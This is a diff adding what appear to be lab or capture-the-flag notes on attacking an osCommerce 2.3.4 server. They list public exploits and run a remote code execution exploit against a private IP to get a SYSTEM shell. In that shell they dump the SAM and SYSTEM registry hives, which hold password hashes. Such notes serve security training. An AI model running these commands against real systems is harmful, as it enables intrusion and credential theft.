@@ -1,0 +1,53 @@
+
+
+on port 8080 we find osCommerce 2.3.4
+
+osCommerce 2.3.4 - Multiple Vulnerabilities                                        | php/webapps/34582.txt
+osCommerce 2.3.4.1 - 'currency' SQL Injection                                      | php/webapps/46328.txt
+osCommerce 2.3.4.1 - 'products_id' SQL Injection                                   | php/webapps/46329.txt
+osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                    | php/webapps/46330.txt
+osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                       | php/webapps/49103.txt
+osCommerce 2.3.4.1 - Arbitrary File Upload                                         | php/webapps/43191.py
+osCommerce 2.3.4.1 - Remote Code Execution                                         | php/webapps/44374.py
+osCommerce 2.3.4.1 - Remote Code Execution (2)                                     | php/webapps/50128.py
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat 44374.py           
+# Exploit Title: osCommerce 2.3.4.1 Remote Code Execution
+# Date: 29.0.3.2018
+# Exploit Author: Simon Scannell - https://scannell-infosec.net <contact@scannell-infosec.net>
+# Version: 2.3.4.1, 2.3.4 - Other versions have not been tested but are likely to be vulnerable
+# Tested on: Linux, Windows
+
+# If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible
+# for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page
+# is already installed and does not attempt to do any authentication. It is possible for an attacker to directly
+# execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 50128.py http://10.201.113.117:8080/oscommerce-2.3.4/catalog
+[*] Install directory still available, the host likely vulnerable to the exploit.
+[*] Testing injecting system command to test vulnerability
+User: nt authority\system
+
+RCE_SHELL$ whoami
+nt authority\system
+
+RCE_SHELL$ reg save hklm\sam C:\Windows\Temp\sam && reg save hklm\system C:\Windows\Temp\system
+The operation completed successfully.
+The operation completed successfully.
+
+RCE_SHELL$ 
+
+
+
+
+
+
+
+
+
+
